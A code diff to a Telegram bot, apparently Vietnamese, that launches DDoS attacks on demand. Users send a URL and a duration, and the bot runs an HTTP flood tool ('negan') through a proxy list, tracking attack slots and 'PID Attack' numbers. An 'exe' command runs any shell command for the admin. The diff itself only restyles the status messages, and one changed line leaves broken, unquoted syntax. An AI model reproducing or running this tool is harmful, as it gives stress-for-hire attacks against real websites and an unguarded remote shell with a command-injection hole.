@@ -16,14 +16,14 @@ let queue = [];
 let userProcesses = {};
 let activeAttacks = {};
 
-bot.sendMessage(adminId, '[Version PRO] 🤖 Bot is ready to receive commands.');
+bot.sendMessage(adminId, '[🤖Version PRO🤖] BOT Đang Chờ Lệnh.');
 
 bot.on('message', async (msg) => {
     const chatId = msg.chat.id, text = msg.text, isAdmin = chatId === adminId, isGroup = allowedGroupIds.has(chatId);
     const username = msg.from.username || msg.from.first_name;
     const userId = msg.from.id;
 
-    if (!isAdmin && !isGroup) return bot.sendMessage(chatId, '🚫 Bạn không có quyền thực hiện lệnh này.', { parse_mode: 'HTML' });
+    if (!isAdmin && !isGroup) return bot.sendMessage(chatId, '🚫 Bạn không có quyền sử dụng.', { parse_mode: 'HTML' });
 
     if (text.startsWith('http://') || text.startsWith('https://')) {
         const [host, time] = text.split(' ');
@@ -31,7 +31,7 @@ bot.on('message', async (msg) => {
 
         const attackTime = parseInt(time, 10);
         if (attackTime > maxTimeAttacks) {
-            return bot.sendMessage(chatId, `🚫 Thời gian tấn công không được vượt quá ${maxTimeAttacks} giây.`, { parse_mode: 'HTML' });
+            return bot.sendMessage(chatId, `🚫 Thời gian không được vượt quá ${maxTimeAttacks} giây.`, { parse_mode: 'HTML' });
         }
 
         // Kiểm tra slot người dùng
@@ -39,7 +39,7 @@ bot.on('message', async (msg) => {
             const userAttack = Object.values(activeAttacks).find(a => a.userId === userId);
             if (userAttack) {
                 const remaining = Math.ceil((userAttack.endTime - Date.now()) / 1000);
-                return bot.sendMessage(chatId, `⛔️ Bạn đang có một tiến trình đang chạy, vui lòng đợi ${remaining} giây còn lại!`);
+                return bot.sendMessage(chatId, `📥 Bạn đang có một tiến trình đang chạy, vui lòng đợi ${remaining} giây còn lại!`);
             }
         }
 
@@ -56,7 +56,7 @@ bot.on('message', async (msg) => {
         currentProcesses++;
 
         const startMessage = {
-            Status: "🚀Successfully🚀",
+            ✨🚀🛸Sᴜᴄᴄᴇssғᴜʟʟʏ🛸🚀✨,
             Caller: username,
             "PID Attack": pid,
             Website: host,
@@ -84,7 +84,7 @@ bot.on('message', async (msg) => {
         const child = exec(`node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`, { shell: '/bin/bash' });
         child.on('close', () => {
             const completeMessage = { 
-                Status: "✅Process completed✅", 
+                Status: "👽Process completed👽", 
                 Caller: username, 
                 "PID Attack": pid, 
                 Website: host, 
@@ -114,12 +114,12 @@ bot.on('message', async (msg) => {
 
     if (text.startsWith('exe ') && isAdmin) {
         const command = text.slice(4).trim();
-        if (!command) return bot.sendMessage(chatId, '🚫 Lệnh không được để trống. Ví dụ: exe ls', { parse_mode: 'HTML' });
+        if (!command) return bot.sendMessage(chatId, '🚫 Lệnh không được để trống.', { parse_mode: 'HTML' });
         exec(command, { shell: '/bin/bash' }, (error, stdout, stderr) => {
             bot.sendMessage(chatId, `🚀 Command result:\n<pre>${command}\n${stdout || stderr}</pre>`, { parse_mode: 'HTML' });
         });
         return;
     }
 
-    bot.sendMessage(chatId, '🚫 Lệnh không hợp lệ. Vui lòng bắt đầu lệnh với "exe" hoặc nhập URL và thời gian.', { parse_mode: 'HTML' });
+    bot.sendMessage(chatId, '⚠️ Sai cú pháp! Ví dụ: https://example.com 79', { parse_mode: 'HTML' });
 });
